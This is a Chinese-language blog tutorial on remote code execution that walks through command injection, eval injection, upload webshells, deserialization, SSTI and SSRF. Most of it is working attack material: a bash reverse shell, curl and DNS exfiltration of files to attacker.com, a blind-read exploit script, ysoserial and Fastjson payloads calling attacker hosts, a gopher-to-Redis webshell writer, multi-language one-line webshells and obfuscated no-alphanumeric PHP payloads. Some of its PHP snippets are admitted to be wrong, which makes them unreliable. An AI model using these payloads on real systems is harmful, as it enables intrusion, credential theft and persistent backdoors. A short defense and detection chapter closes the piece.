---
title: RCE 漏洞详解：从原理到实战
date: 2026-06-28 14:00:00
tags:
- RCE
- 命令注入
- 代码执行
- Web安全
categories:
- 安全研究
---

# RCE 漏洞详解：从原理到实战

> 系统化拆解远程代码执行漏洞的各类场景、利用手法与防御方案

---

## 目录

- [第1章 什么是 RCE](#第1章-什么是-rce)
- [第2章 命令注入](#第2章-命令注入)
- [第3章 代码注入](#第3章-代码注入)
- [第4章 文件上传导致 RCE](#第4章-文件上传导致-rce)
- [第5章 反序列化 RCE](#第5章-反序列化-rce)
- [第6章 SSTI 模板注入 RCE](#第6章-ssti-模板注入-rce)
- [第7章 SSRF 到 RCE](#第7章-ssrf-到-rce)
- [第8章 其他 RCE 场景](#第8章-其他-rce-场景)
- [第9章 防御与修复](#第9章-防御与修复)
- [附录 Payload 速查](#附录-payload-速查)

---

## 第1章 什么是 RCE

### 1.1 定义

RCE（Remote Code Execution，远程代码执行）指攻击者通过漏洞在目标服务器上执行任意命令或代码。这是 Web 安全中**危害等级最高**的漏洞之一，因为一旦成功，攻击者就相当于获得了服务器的控制权。

### 1.2 RCE 能做什么

```bash
# 拿到 RCE 后可以做的事：
id                    # 查看当前用户权限
whoami                # 我是谁
cat /flag             # 读取 flag（CTF 场景）
ls -la /              # 遍历文件系统
ifconfig              # 查看网络信息
curl http://vps/?f=$(cat /flag)  # 外带数据
bash -c "bash -i >& /dev/tcp/vps/4444 0>&1"  # 反弹 shell
```

### 1.3 RCE 的两大分类

| 类型 | 特征 | 示例 |
|------|------|------|
| **命令注入** | 执行系统命令（OS 级别） | `ping 127.0.0.1; id` |
| **代码注入** | 执行编程语言代码（PHP/Python/Java 等） | `eval($_GET['cmd'])` |

---

## 第2章 命令注入

### 2.1 原理

当应用程序将用户输入拼接到系统命令中执行时，攻击者可以注入额外的命令。

**漏洞代码（PHP）：**

```php
<?php
$ip = $_GET['ip'];
system("ping -c 3 " . $ip);  // ← 用户输入直接拼接
?>
```

正常请求：`?ip=127.0.0.1` → 执行 `ping -c 3 127.0.0.1`

恶意请求：`?ip=127.0.0.1; id` → 执行 `ping -c 3 127.0.0.1; id`

### 2.2 命令分隔符

不同系统支持的命令分隔符：

| 分隔符 | 含义 | 示例 | 通用性 |
|--------|------|------|--------|
| `;` | 顺序执行 | `cmd1; cmd2` | Linux/Windows |
| `&&` | 前成功后执行 | `cmd1 && cmd2` | Linux/Windows |
| `||` | 前失败后执行 | `cmd1 || cmd2` | Linux/Windows |
| `|` | 管道输出 | `cmd1 | cmd2` | Linux/Windows |
| `` ` `` | 命令替换 | `\`cmd\`` | Linux |
| `$()` | 命令替换 | `$(cmd)` | Linux |
| `%0a` | URL编码换行 | `cmd1%0acmd2` | Linux/Windows |

### 2.3 有回显 vs 无回显

**有回显**：命令执行结果直接显示在页面上，直接读 flag 即可。

**无回显**：页面不显示输出，需要用外带方式：

```bash
# DNS 外带
ping `whoami`.attacker.com

# HTTP 外带
curl http://attacker.com/$(cat /flag | base64)

# 延时判断（时间盲注）
ping -c 10 127.0.0.1  # 如果执行了，响应延迟10秒
```

### 2.4 常见命令注入函数

| 语言 | 危险函数 |
|------|---------|
| PHP | `system()`、`exec()`、`shell_exec()`、`passthru()`、`popen()`、`\`\``（反引号） |
| Python | `os.system()`、`os.popen()`、`subprocess.run()`、`subprocess.Popen()` |
| Java | `Runtime.getRuntime().exec()`、`ProcessBuilder` |
| Node.js | `child_process.exec()`、`child_process.spawn()` |
| Go | `exec.Command()`、`os/exec` 包 |

### 2.5 命令注入 Payload 示例

```bash
# 基本测试
?ip=127.0.0.1; id
?ip=127.0.0.1 && whoami
?ip=127.0.0.1 | id
?ip=127.0.0.1$(whoami)

# 空格被过滤
?ip=127.0.0.1;{cat,/flag}
?ip=127.0.0.1;cat$IFS/flag
?ip=127.0.0.1;cat%09/flag  # %09 = Tab

# 关键字被过滤
?ip=127.0.0.1;c'a't /flag
?ip=127.0.0.1;c"a"t /flag
?ip=127.0.0.1;c\at /flag
?ip=127.0.0.1;cat /fl''ag

# Base64 编码绕过
?ip=127.0.0.1;echo Y2F0IC9mbGFn | base64 -d | bash
# Y2F0IC9mbGFn = "cat /flag" 的 base64
```

### 2.6 无回显命令注入 EXP 模板

```python
#!/usr/bin/env python3
"""
无回显命令注入 EXP - 通过延时判断
"""
import requests
import time

TARGET = "http://target.com/ping"
PAYLOAD = "127.0.0.1; sleep 5"

def check_vuln():
    start = time.time()
    r = requests.get(TARGET, params={"ip": PAYLOAD})
    elapsed = time.time() - start
    if elapsed > 5:
        print("[+] 命令注入存在！响应延迟 {:.2f}s".format(elapsed))
        return True
    print("[-] 无注入或命令未执行")
    return False

def blind_read(cmd):
    """逐字符盲读 flag"""
    result = ""
    for pos in range(1, 50):
        for c in "abcdefghijklmnopqrstuvwxyz0123456789{}_-":
            start = time.time()
            # 如果第 pos 位字符是 c，则 sleep 5 秒
            payload = f"127.0.0.1; if [ $(cat /flag | cut -c{pos}) = {c} ]; then sleep 5; fi"
            r = requests.get(TARGET, params={"ip": payload})
            elapsed = time.time() - start
            if elapsed > 5:
                result += c
                print(f"[+] 第{pos}位: {c} → 当前: {result}")
                break
        else:
            break
    print(f"[✓] Flag: {result}")

check_vuln()
```

---

## 第3章 代码注入

### 3.1 原理

代码注入是指攻击者通过漏洞让服务器执行编程语言代码（而非系统命令）。

### 3.2 常见代码注入函数

#### PHP

```php
eval($_GET['cmd']);         // 执行任意 PHP
assert($_GET['cmd']);       // 类似 eval
preg_replace('/a/e', $_GET['cmd'], 'a');  // /e 修饰符 → 已废弃
call_user_func($_GET['func'], $_GET['arg']);
```

#### Python

```python
eval(user_input)           # 表达式求值
exec(user_input)           # 执行任意代码
compile(user_input, '', 'exec')
__import__('os').system('id')
```

#### Java

```java
// SpEL 表达式注入
new ExpressionParser().parseExpression(user_input).getValue();

// Java EL 注入
ELProcessor.eval(user_input);
```

### 3.3 PHP eval 注入实例

```php
// 漏洞代码
<?php eval($_POST['code']); ?>
```

**Payload：**

```php
// 读取文件
code=echo file_get_contents('/flag');

// 执行命令
code=system('id');

// 写 webshell
code=file_put_contents('shell.php', '<?php eval($_POST["c"]);?>');

// PHP 信息
code=phpinfo();
```

### 3.4 RCE vs 命令注入

| 对比 | 命令注入 | 代码注入 |
|------|---------|---------|
| 函数 | `system()`、`exec()` | `eval()`、`assert()` |
| 执行什么 | 系统命令（shell） | 编程语言代码 |
| Payload | `;id`、`\|cat /flag` | `system('id')`、`1;phpinfo()` |
| 限制 | 受系统用户权限限制 | 受语言沙箱限制 |

---

## 第4章 文件上传导致 RCE

### 4.1 原理

如果服务器允许上传文件但未充分检验文件类型，攻击者可以上传 webshell 并通过访问该文件执行代码。

### 4.2 常见绕过方式

```bash
# 后缀绕过
shell.php        # 标准 PHP 文件
shell.phtml      # PHP 可识别
shell.php5       # PHP 可识别
shell.php.jpg    # 双后缀
shell.php.       # 末尾点号
shell.php%00.jpg # 空字节截断（PHP < 5.3.4）
shell.asp;.jpg   # 分号截断

# Content-Type 绕过
Content-Type: image/jpeg

# 文件头绕过
GIF89a <?php system($_GET['cmd']); ?>

# .htaccess 绕过（重写解析规则）
# 先上传 .htaccess，内容：
AddType application/x-httpd-php .jpg
# 再上传 shell.jpg → 当作 PHP 执行

# 竞争条件绕过
# 上传临时文件在检查前瞬间访问
```

### 4.3 图片马制作

```bash
# Linux
echo 'GIF89a<?php system($_GET["cmd"]);?>' > shell.gif

# 或嵌入正常图片
exiftool -Comment='<?php system($_GET["cmd"]);?>' image.jpg
```

---

## 第5章 反序列化 RCE

### 5.1 原理

当应用程序反序列化用户可控的数据时，攻击者可以构造恶意数据触发代码执行。

### 5.2 PHP 反序列化

PHP 的 `unserialize()` 在反序列化时自动调用 `__wakeup()` 和 `__destruct()` 魔术方法，攻击者利用这些方法中的危险操作实现 RCE。

```php
// 漏洞类示例
class User {
    public $name;
    public $cmd;
    
    function __destruct() {
        system($this->cmd);  // 在析构时执行命令
    }
}

// 攻击者构造
$payload = new User();
$payload->name = "test";
$payload->cmd = "cat /flag";
echo serialize($payload);
// O:4:"User":2:{s:4:"name";s:4:"test";s:3:"cmd";s:8:"cat /flag";}
```

### 5.3 Python pickle 反序列化

```python
import pickle
import base64

class RCE:
    def __reduce__(self):
        import os
        return (os.system, ('cat /flag',))

payload = base64.b64encode(pickle.dumps(RCE()))
print(payload)
```

### 5.4 Java 反序列化

Java 反序列化通常通过 **ysoserial** 工具生成 Payload：

```bash
java -jar ysoserial.jar CommonsCollections1 'curl http://attacker/?f=$(cat /flag)' > payload.ser
```

前端的 Fastjson / Jackson / XStream 等 JSON 解析库同样存在反序列化 RCE：

```json
// Fastjson 1.2.24 RCE
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}
```

---

## 第6章 SSTI 模板注入 RCE

### 6.1 原理

当用户输入被直接拼接到模板字符串中而不是作为变量传入时，攻击者可以注入模板表达式执行代码。

### 6.2 各引擎 RCE Payload

#### Jinja2（Python Flask）

```jinja2
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__['os'].popen('id').read() }}
```

#### Twig（PHP）

```twig
{{ ['id']|filter('system') }}
```

#### Freemarker（Java）

```ftl
${"freemarker.template.utility.Execute"?new()("id")}
```

#### Thymeleaf（Java Spring）

```
__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x
```

---

## 第7章 SSRF 到 RCE

### 7.1 原理

SSRF（服务端请求伪造）本身不是 RCE，但可以配合内网服务实现 RCE。

### 7.2 SSRF + Redis 写 Webshell

```bash
# 利用 gopher 协议向 Redis 发送命令
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a<?php system($_GET['cmd']);?>%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

### 7.3 SSRF + 云元数据

云服务环境中的 SSRF 可以读取元数据获取临时凭证，再通过云 API 执行命令：

```bash
# AWS
http://169.254.169.254/latest/meta-data/iam/security-credentials/admin

# 阿里云
http://100.100.100.200/latest/meta-data/ram/security-credentials/admin
```

---

## 第8章 其他 RCE 场景

### 8.1 SQL 注入写 WebShell

MySQL 有写文件权限时：

```sql
SELECT '<?php system($_GET["cmd"]);?>' INTO OUTFILE '/var/www/html/shell.php'
```

### 8.2 XXE + expect RCE

PHP 安装 expect 扩展时：

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<root>&xxe;</root>
```

### 8.3 文件包含 + 日志注入

```bash
# 1. 向日志写入恶意代码
curl -H "User-Agent: <?php system('cat /flag');?>" http://target/

# 2. LFI 包含日志文件
?file=/var/log/apache2/access.log
```

### 8.4 ZIP 解压路径穿越

```bash
# 构造恶意 ZIP 文件，包含符号链接或路径穿越文件
# 解压后覆盖关键文件（如 ~/.ssh/authorized_keys）
ln -s /root/.ssh/authorized_keys backdoor
zip --symlinks malicious.zip backdoor
```

### 8.5 无字母数字 RCE（PHP）

这是一类经典 CTF 题型：WAF 过滤了所有字母和数字，只允许 `!@#$%^&*()[]{ }',./<>?~` 等符号执行代码。核心原理是 **PHP 的弱类型 + 位运算**。

---

#### 方法一：NOT 取反法（最实用）

PHP 中 `~"\x8c"` 等于 `chr(~0x8c) = chr(0x73) = 's'`。任意字符串都可以用取反编码：

```php
<?php
// system 的取反编码
// s=0x73=~0x8C, y=0x79=~0x86, s=0x73=~0x8C
// t=0x74=~0x8B, e=0x65=~0x9A, m=0x6D=~0x92
(~"\x8c\x86\x8c\x8b\x9a\x92")();  // 调用 system()
```

**完整 Payload ：**

```php
<?php
// system('cat /flag');
(~"\x8c\x86\x8c\x8b\x9a\x92")(~"\x9c\x9e\x8b\xdf\xd0\x99\x93\x9e\x98");

// system('id');
(~"\x8c\x86\x8c\x8b\x9a\x92")(~"\x96\x9b");

// phpinfo();
(~"\x8f\x97\x8f\x96\x91\x99\x90")();

// assert('id');
(~"\x9e\x8c\x8c\x9a\x8d\x8b")(~"\x96\x9b");

// eval('system("id")');
(~"\x9a\x89\x9e\x93")(~"\x8c\x86\x8c\x8b\x9a\x92\x96\x9b\x93\x9c\x8b\x9a\x99\x92\x92\x91\x98\x96\x99\x9e\x93\x9b\x9f\x8d\x9a\x9a\x8c\x9a\x91\x98\x9a\x8d\x92\x9a\x89\x9f\x91\x96\x98\x99\x8c\x92\x96\x99\x91\x98\x97\x8d\x9a\x9a\x9c\x86\x8b\x9a\x92");
// 更简洁：直接传参
```

**NOT 取反常用函数编码表 ：**

| 函数 | 取反编码 |
|------|---------|
| `system` | `\x8c\x86\x8c\x8b\x9a\x92` |
| `phpinfo` | `\x8f\x97\x8f\x96\x91\x99\x90` |
| `assert` | `\x9e\x8c\x8c\x9a\x8d\x8b` |
| `eval` | `\x9a\x89\x9e\x93` |
| `popen` | `\x8f\x90\x8f\x9a\x91` |
| `file_get_contents` | `\x99\x96\x93\x9a\xa0\x98\x9a\x8b\xa0\x9c\x90\x91\x8b\x9a\x91\x8b\x8c` |

```php
// 生成任意字符串取反编码的 PHP 代码：
function to_not($str) {
    $enc = '';
    for ($i = 0; $i < strlen($str); $i++) {
        $enc .= '\\x' . dechex(~ord($str[$i]) & 0xFF);
    }
    return $enc;
}
echo to_not('cat /flag');  // \x9c\x9e\x8b\xdf\xd0\x99\x93\x9e\x98
```

---

#### 方法二：XOR 异或构造法

两个符号异或可以产生字母。已验证的对照表：

```php
<?php
// 已验证的异或对（符号 ^ 符号 = 目标字母）
// '!' ^ '@' = 'a'   (0x21 ^ 0x40 = 0x61)
// '!' ^ '~' = '_'   (0x21 ^ 0x7E = 0x5F)
// '@' ^ '#' = 'c'   (0x40 ^ 0x23 = 0x63)
// '@' ^ '%' = 'e'   (0x40 ^ 0x25 = 0x65)
// '@' ^ '&' = 'f'   (0x40 ^ 0x26 = 0x66)
// '@' ^ ',' = 'l'   (0x40 ^ 0x2C = 0x6C)
// '@' ^ '-' = 'm'   (0x40 ^ 0x2D = 0x6D)
// '@' ^ ''' = 'g'   (0x40 ^ 0x27 = 0x67)
// '$' ^ ']' = 'y'   (0x24 ^ 0x5D = 0x79)
// '^' ^ '-' = 's'   (0x5E ^ 0x2D = 0x73)
// '^' ^ '*' = 't'   (0x5E ^ 0x2A = 0x74)
// '%' ^ '`' = 'E'   (0x25 ^ 0x60 = 0x45)
// '{' ^ '<' = 'G'   (0x7B ^ 0x3C = 0x47)
// '*' ^ '~' = 'T'   (0x2A ^ 0x7E = 0x54)
// '@' ^ '`' = ' '   (0x40 ^ 0x60 = 0x20)
```

> **注意**：`/`（0x2F）无法用两个非字母数字符号 XOR 构造，因为 0x2F 的二进制 0010_1111 需要至少一个字母位才能异或得到。此时请用 NOT 取反法，或通过 `$_GET` 传参绕过。

**构造 `$_GET` 的 XOR Payload（已验证）：**

```php
<?php
// 逐字符构造 $_GET
// '_' = '!' ^ '~'  (0x21 ^ 0x7E = 0x5F)
// 'G' = '{' ^ '<'  (0x7B ^ 0x3C = 0x47)
// 'E' = '%' ^ '`'  (0x25 ^ 0x60 = 0x45)
// 'T' = '*' ^ '~'  (0x2A ^ 0x7E = 0x54)

$__ = ('!' ^ '~');       // $__ = '_'
$___ = $$__;             // $___ = $_GET
$___($__);               // 这是错的，不能通过 $___ 直接调用

// 可变变量调用：
$__ = ('!' ^ '~');       // '_'
$___ = $$__;             // $_GET
$____ = $___[('!'^'~')];  // $_GET['_'] = $_GET['_']
// 访问 ?_=system&__=cat /flag

// 或者直接用动态函数调用：
$_ = ('!' ^ '~');        // '_'  
$__ = $$_;               // $_GET
$__($_);                 // 调用 $_GET['_']  
// 访问: ?_=system&__=cat /flag
// 等价于 system('cat /flag')
```

---

#### 方法三：OR 或运算构造法

OR 运算的局限性较大——很多字母无法用符号 OR 得到，因为 OR 运算总是 >= 两数的最大值：

```php
<?php
// '!' | '@' = 'a'   (0x21 | 0x40 = 0x61)
// '@' | '#' = 'c'   (0x40 | 0x23 = 0x63)
// '@' | '%' = 'e'   (0x40 | 0x25 = 0x65)
// '@' | '&' = 'f'   (0x40 | 0x26 = 0x66)
// '@' | ''' = 'g'   (0x40 | 0x27 = 0x67)
// '@' | ',' = 'l'   (0x40 | 0x2C = 0x6C)
// '@' | '-' = 'm'   (0x40 | 0x2D = 0x6D)
// '!' | '.' = '/'   (0x21 | 0x2E = 0x2F)
// '^' | '[' = '_'   (0x5E | 0x5B = 0x5F)

// 局限：s(0x73)、y(0x79)、t(0x74)、G(0x47)、E(0x45)、T(0x54)
// 用 OR 无法构造，因为它们的比特位需要字母位才能匹配
```

---

#### 方法四：自增 + 数组类型转换

利用 PHP 的类型转换链，从空数组逐步推导出字符串：

```php
<?php
// 经典无字母 webshell——一行代码，不出现任何字母数字
$_=[].'';                 // [] + '' = 'Array'（Array 转为字符串）
$_=($_==$_).$_;           // true + 'Array' = '1Array'
$_=($_++).$_+$_;          // '2Array'... 这个过程太复杂

// 实战推荐用更简洁的取反法或可变变量法
```

---

#### 方法五：利用 `$_GET` / `$_POST` 传参（最稳定）

当 WAF 只拦代码中的字母数字但不拦 HTTP 参数时：

```php
<?php
// 仅用符号构造
$__ = ('!' ^ '~');    // $__ = '_'（已验证）
$___ = $$__;          // $___ = $_GET（可变变量）
$___($__);            // 调用 $_GET['_']
?>
<!-- 访问: ?_=system&__=cat /flag -->
```

原理分解：

| 步骤 | 代码 | 等效 |
|------|------|------|
| 1 | `$__ = ('!' ^ '~');` | `$__ = '_'`（XOR 已验证） |
| 2 | `$___ = $$__;` | `$___ = $_GET`（可变变量） |
| 3 | `$___($__);` | 报错，缺少参数 |
| 修正 | `$___($__[0]);` | 取参数 |

> **注意**：实际使用中，上面的写法需要微调。更推荐用 NOT 取反法，因为：
> 1. NOT 对所有字符都有效（包括 `/`）
> 2. NOT 只需要 `~` 一个符号，兼容性最好
> 3. NOT Payload 可以提前生成好，直接使用

---

#### 实战总结

| 方法 | 优势 | 劣势 | 优先级 |
|------|------|------|--------|
| **NOT 取反** | 任意字符都行，通用性强 | Payload 较长 | ⭐ 最推荐 |
| **XOR 异或** | Payload 短，不需要不可见字符 | `/` 等字符无法构造 | ⭐ 推荐 |
| **OR 或运算** | 对特定字符有效 | s/y/t 等字母无法构造 | ❌ 不推荐单独用 |
| **可变变量** | 可传任意参数 | 需要额外 GET/POST 参数 | ⭐ 推荐组合使用 |
| **自增/数组** | 完全零字符 | 极其复杂，容易写错 | ❌ CTF 炫技用 |

---

## 第9章 防御与修复

### 9.1 通用原则

```python
# ❌ 永远不要这样做
system("ping " + user_input)      # 命令注入
eval(user_input)                  # 代码注入
unserialize(user_input)           # 反序列化
include(user_input)               # 文件包含

# ✅ 正确的做法
subprocess.run(["ping", ip])      # 参数分离，不经过 shell
allowed_values.get(user_input)    # 白名单校验
json.loads(user_input)            # 安全的序列化格式
```

### 9.2 各场景防御方案

| 场景 | 防御方法 |
|------|---------|
| **命令注入** | 使用参数化 API、避免 shell 调用、白名单过滤 |
| **代码注入** | 禁用 eval/assert 等危险函数、使用沙箱 |
| **文件上传** | 白名单后缀、MIME 校验、重命名文件、独立存储 |
| **反序列化** | 使用 JSON 替代 pickle、签名验证、Sanitize |
| **SSTI** | 用户输入作为变量值而非模板代码、启用沙箱 |
| **SSRF** | 白名单域名/IP、禁止内网访问、限制协议 |

### 9.3 RCE 修复优先级

如果发现 RCE 漏洞，修复优先级：

```
1️⃣ 立即下线受影响的服务
2️⃣ 紧急修复漏洞代码（热修复/回滚）
3️⃣ 排查日志，确认是否已被利用
4️⃣ 轮换受影响服务器的所有密钥和密码
5️⃣ 安全加固 + 新增监控告警
6️⃣ 复盘：为什么 RCE 没有被前面的防线拦住
```

### 9.4 RCE 检测方法

```bash
# Linux 检测入侵痕迹
last                      # 查看登录记录
cat /var/log/auth.log     # 查看认证日志
find / -name "*.php" -mmin -60  # 最近一小时的 PHP 文件
ls -la /tmp               # 检查可疑临时文件
netstat -anpt             # 查看异常连接
cat ~/.bash_history       # 查看历史命令
```

---

## 附录 Payload 速查

### 命令注入 Payload

```bash
# Linux
; id
| id
`id`
$(id)
; cat /flag

# Windows
| dir
& whoami
; type C:\flag.txt

# 盲注延迟
| ping -c 10 127.0.0.1
```

### PHP 代码注入

```php
system('id');
phpinfo();
file_get_contents('/flag');
file_put_contents('shell.php', '<?php @eval($_POST[c]);?>');
```

### 一句话 WebShell

```php
# PHP
<?php @eval($_POST['c']);?>
<?php system($_GET['c']);?>
<?php @assert($_POST['c']);?>

# ASP
<%eval request("c")%>

# ASPX
<%@ Page Language="Jscript"%><%eval(Request.Item["c"]);%>

# JSP
<% Runtime.getRuntime().exec(request.getParameter("c")); %>
```

### RCE 可用工具链

| 工具 | 用途 |
|------|------|
| **蚁剑（AntSword）** | 管理 WebShell 的 GUI 工具 |
| **Burp Suite + Repeater** | 手工测试 RCE |
| **ysoserial** | Java 反序列化 Payload 生成 |
| **PHPGGC** | PHP 反序列化 Gadget Chain |
| **nc / ncat** | 反弹 Shell 监听 |
| **Metasploit** | 生成 Payload + 建立会话 |

### RCE 发现检查清单

```
□ 所有用户输入都经过参数分离了吗？
□ 有没有使用 eval/assert/system/exec？
□ 上传的文件有没有重命名？
□ 反序列化的数据有没有签名校验？
□ 模板引擎的沙箱开启了吗？
□ SSRF 的目标是否做了白名单？
□ 危险的系统函数是否已禁用？
□ 最新安全补丁打上了吗？
```

> **RCE 是安全防线的最后一道门——一旦失守，整个系统就交到了攻击者手上。防御的关键不在于修补某一类漏洞，而在于**「永远不要信任用户输入」**这条铁律。**
